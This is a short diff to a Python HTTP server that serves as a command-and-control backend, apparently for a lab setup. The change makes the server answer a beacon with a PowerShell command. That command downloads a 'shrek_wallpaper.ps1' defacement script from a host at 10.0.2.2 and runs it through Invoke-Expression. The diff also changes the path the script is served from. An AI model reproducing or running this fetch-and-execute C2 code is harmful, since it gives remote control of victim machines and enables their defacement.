@@ -15,7 +15,7 @@ class CustomHandler(SimpleHTTPRequestHandler):
 
     def do_GET(self):
         if self.path == '/shrek_wallpaper':
-            self.serve_file('../../shrek_wallpaper.ps1')
+            self.serve_file('../defacement/shrek_wallpaper.ps1')
             return
 
         log_data = ''
@@ -32,7 +32,7 @@ class CustomHandler(SimpleHTTPRequestHandler):
         self.end_headers()
 
         # Single command sent to C2 Beacon
-        response_content = r''''''
+        response_content = r'''Invoke-WebRequest -Uri "http://10.0.2.2:8080/shrek_wallpaper" | Invoke-Expression'''
         ###########################
 
         self.wfile.write(response_content.encode('utf-8'))
@@ -66,7 +66,8 @@ class CustomHandler(SimpleHTTPRequestHandler):
 
                 # Open and read the file
                 with open(file_path, 'rb') as file:
-                    self.wfile.write(file.read())
+                    command = file.read()
+                    self.wfile.write(command)
             else:
                 self.send_response(404)
                 self.end_headers()
